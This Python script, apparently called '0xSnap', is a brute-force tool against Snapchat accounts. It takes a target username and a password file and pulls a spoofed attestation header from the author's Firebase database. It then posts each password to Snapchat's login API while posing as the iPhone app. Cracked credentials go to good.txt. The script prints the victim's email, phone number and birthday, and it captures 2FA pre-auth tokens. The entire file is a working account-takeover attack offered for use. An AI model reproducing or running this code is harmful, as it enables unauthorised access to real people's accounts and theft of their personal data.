#!/usr/bin/python3
import requests
from time import sleep
import sys,os,json
import random
import subprocess

info_color = "\033[1;33m"
red_color = "\033[1;31m"
green_color = "\033[1;32m"
detect_color = "\033[1;34m"
end_banner_color = "\33[00m"


print(detect_color+ """

                                                          
,pP"Ybd `7MMpMMMb.   ,6"Yb. `7MMpdMAo.  ,pP""Yq.`7M'   `MF'
8I   `"   MM    MM  8)   MM   MM   `Wb 6W'    `Wb `VA ,V'
`YMMMa.   MM    MM   ,pm9MM   MM    M8 8M      M8   XMX
L.   I8   MM    MM  8M   MM   MM   ,AP YA.    ,A9 ,V' VA.
M9mmmP' .JMML  JMML.`Moo9^Yo. MMbmmd'   `Ybmmd9'.AM.   .MA.
                              MM
                            .JMML.

    """)
    

print(red_color+'[0xSnap@0xfff0800]'+ green_color + '-[~/FaLaH 13.1v]')


print('')
user = input (end_banner_color+"Usernames => ")
flo = input ("List Of Passwords => ")
server = input ("Enter the server number 0/10 = > ")
linux = 'clear'
windows = 'cls'

def Login():
    url = 'https://my-bye-thost-flaah999-default-rtdb.firebaseio.com/.json'
    response = requests.request ("GET", url)
    info = json.loads (response.text)

    try:
        att = (str(info["X-Snapchat-Att"][int(float(server))]))
    except:
        print(info_color+"""
      
      The end server has been reached
      
      Choose from ( 0 to 10 ) please

      When you skip the correct password, let us know via Snapchat flaah999 to confirm that 0xSnap is not deleted 
      because we update it for you automatically from the server

      """)
        exit()
    uesr = '' 
    chars2 = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm'
    amount = '1'
    amount = int(amount)
    length2 = "1"
    length2 = int(length2)
    for key in range(amount):
        key = ''
        for item in range(length2):
            key = ''
        for item in range(length2):
            key += random.choice(chars2)
    password = open(flo).read().splitlines()
    for password in password:
            hed={
            "X-Snapchat-Uuid": "D348BDC9-2FA4-4BB9-A7CC-5595250FB823",
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "User-Agent": "Snapchat/11.79.0.31 (iPhone9,3; iOS 15.7.5; gzip)",
            "Accept": "application/json",
            "X-Snapchat-Att": (att).format(key),
            "Host": "gcp.api.snapchat.com"
        }
            da = f"device_check_token=sx&password={password}&username={user}"
            url= "https://gcp.api.snapchat.com/scauth/login"
            for i in range (1) :
                sleep(3)
            r= requests.request ("POST",url,headers=hed,data=da)
            sleep(0.50)
            sys.stdout.write(f'\rplease wait ..')
            print(f'ok ..')
            try:
                info = json.loads(r.text)
            except:
                pass
            if 'updates_response' in r.text:
                print (red_color + "---------------------------------------")
                print ((green_color + 'username : ' + user + ' | password : ' + password + ' --> Good hack '))
                print (green_color + " --> Email : " + str (info["updates_response"]["email"]))
                print (green_color + " --> mobile : " + str (info["updates_response"]["mobile"]))
                print (green_color + " --> birthday : " + str (info["updates_response"]["birthday"]))
                with open ('good.txt', 'a') as x:x.write (user + ':' + password + '\n')
                exit()
            if 'two_fa_needed' in r.text:
                print (red_color + "---------------------------------------")
                print (
                    (green_color + 'username : ' + user + ' | password : ' + password + ' --> Good hack -> Oops 2FA '))
                print (green_color + " --> number 2FA : " + str (info["is_sms_two_fa_enabled"]))
                print (green_color + " --> token 2FA : " + str (info["pre_auth_token"]))
                print (green_color + " --> number 2FA : " + str (info["phone_number"]))
                with open ('good-2FA.txt', 'a') as x:x.write (user + ':' + password + '\n')
                exit()
            if 'Could Not Connect' in r.text:
                try:
                    + str (Login())
                    print(key)
                except:
                    pass
            if 'Oh no!' in r.text:
                try:
                    + str (Login())
                    print(key)
                except:
                    pass
            elif 'logged' in r.text:
                print ((green_color + 'username : ' + user + ' | password : ' + password + '' +  red_color + ' --> Error | ' + str (info["message"])))
                with open(flo, "r") as f:
                         lines = f.readlines()
                with open(flo, "w") as f:
                    for line in lines:
                        if line.strip("\n") != password:
                            f.write(line)
                print(end_banner_color+"The password has been deleted from the file")
                print("========================================")
if __name__ == "__main__":
    Login()